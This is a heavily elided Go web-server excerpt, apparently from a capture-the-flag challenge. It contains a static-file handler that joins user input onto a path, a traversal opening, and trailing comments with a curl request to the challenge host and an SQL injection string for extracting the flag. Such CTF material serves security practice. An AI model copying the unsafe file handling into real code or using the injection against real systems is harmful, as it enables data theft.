...
func main() {
	...
	http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {
		...
		content, err := ioutil.ReadFile(filepath.Join("./static/", filename))
		if err != nil {
	...
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		...
		log.Println(session.Values["username"]) //check input
...
// curl http://dvd.chal.h4ck3r.quest:10001/ -i -X GET -b "session="
// ' OR flag LIKE '%FLAG{%' OR '